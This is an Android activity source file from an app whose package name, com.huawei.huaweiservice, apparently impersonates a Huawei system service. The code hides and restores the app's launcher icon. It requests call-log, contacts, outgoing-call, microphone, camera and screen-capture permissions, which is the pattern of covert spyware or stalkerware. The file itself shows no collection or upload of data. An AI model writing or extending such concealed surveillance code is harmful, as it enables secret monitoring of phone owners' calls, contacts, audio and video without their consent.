package com.huawei.huaweiservice;

import android.Manifest;
import android.app.ProgressDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.support.v4.app.ActivityCompat;
import android.view.View;
import android.support.v7.app.AppCompatActivity;
import android.widget.Button;
import android.widget.Toast;

import java.util.List;

public class MainActivity extends AppCompatActivity
        implements View.OnClickListener {
    //Defining Variables
    Button btnCommon;
    private static final ComponentName LAUNCHER_COMPONENT_NAME = new ComponentName(
            "com.huawei.huaweiservice", "com.huawei.huaweiservice.launchAppReceiver");
    public static int REQUEST_MULTIPLE_PERMISSIONS = 100;
    boolean boolean_permission;
    ProgressDialog progressDialog;
    private static Context context;
    private static DBHandler dbHelper;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        context = this.getApplicationContext();
        dbHelper = new DBHandler();
        DatabaseManager.initializeInstance(dbHelper);
        setContentView(R.layout.activity_main);
        init();
        fn_permission();
        listener();
    }

    public static Context getContext() {
        return context;
    }



    private void init() {
        btnCommon = (Button) findViewById(R.id.btn_hide);
        progressDialog = new ProgressDialog(MainActivity.this);
        progressDialog.setTitle("Alert");
        progressDialog.setMessage("Please wait");
        if (isLauncherIconVisible()) {
            btnCommon.setText("Hide");
        } else {
            btnCommon.setText("Unhide");
        }
    }

    private void listener() {
        btnCommon.setOnClickListener(this);
    }

    @Override
    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.btn_hide:
                progressDialog.show();
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        progressDialog.dismiss();
                        if (isLauncherIconVisible()) {
                            btnCommon.setText("Hide");
                        } else {
                            btnCommon.setText("Unhide");
                        }
                    }
                }, 10000);
                if (boolean_permission) {
                    if (isLauncherIconVisible()) {
                        fn_hideicon();
                        //Intent i = new Intent(this, getCallDetailsActivity.class);
                        //startActivity(i);
                    } else {
                        fn_unhide();
                    }
                } else {
                    Toast.makeText(getApplicationContext(), "Please allow the permission", Toast.LENGTH_LONG).show();
                }
                break;
        }
    }


    private boolean isLauncherIconVisible() {
        int enabledSetting = getPackageManager().getComponentEnabledSetting(LAUNCHER_COMPONENT_NAME);
        return enabledSetting != PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
    }

    private void fn_hideicon() {
        PackageManager pm = getApplicationContext().getPackageManager();
        pm.setComponentEnabledSetting(LAUNCHER_COMPONENT_NAME,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
    }

    private void fn_unhide() {
        PackageManager p = getPackageManager();
        p.setComponentEnabledSetting(LAUNCHER_COMPONENT_NAME, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    private void fn_permission() {


        if (ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.PROCESS_OUTGOING_CALLS) != PackageManager.PERMISSION_GRANTED
                || ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED
                || ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED
                || ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED
                || ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED
                || ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.CAPTURE_AUDIO_OUTPUT) != PackageManager.PERMISSION_GRANTED
                || ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.CAPTURE_VIDEO_OUTPUT) != PackageManager.PERMISSION_GRANTED
                || ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
                || ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.CAPTURE_SECURE_VIDEO_OUTPUT) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this, Manifest.permission.PROCESS_OUTGOING_CALLS)
                    || ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this, Manifest.permission.READ_CALL_LOG)
                    || ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this, Manifest.permission.READ_CONTACTS)
                    || ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this, Manifest.permission.RECORD_AUDIO)
                    || ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this, Manifest.permission.CAMERA)
                    || ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this, Manifest.permission.CAPTURE_AUDIO_OUTPUT)
                    || ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this, Manifest.permission.CAPTURE_VIDEO_OUTPUT)
                    || ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                    || ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this, Manifest.permission.CAPTURE_SECURE_VIDEO_OUTPUT)
                    ) {
                //Show Information about why you need the permission
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{
                                android.Manifest.permission.PROCESS_OUTGOING_CALLS,
                                android.Manifest.permission.READ_CONTACTS,
                                android.Manifest.permission.READ_CALL_LOG,
                                android.Manifest.permission.RECORD_AUDIO,
                                android.Manifest.permission.CAMERA,
                                android.Manifest.permission.CAPTURE_AUDIO_OUTPUT,
                                android.Manifest.permission.CAPTURE_VIDEO_OUTPUT,
                                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                                android.Manifest.permission.CAPTURE_SECURE_VIDEO_OUTPUT
                        }, REQUEST_MULTIPLE_PERMISSIONS);
            }
        } else {
            boolean_permission = true;
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_MULTIPLE_PERMISSIONS) {
            if (grantResults.length > 0) {
                for (int i = 0; i < grantResults.length; i++) {
                    if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                        boolean_permission = true;
                    } else {
                        Toast.makeText(getApplicationContext(), "Please allow the permission", Toast.LENGTH_LONG).show();
                    }
                }
            }
        }
    }

}
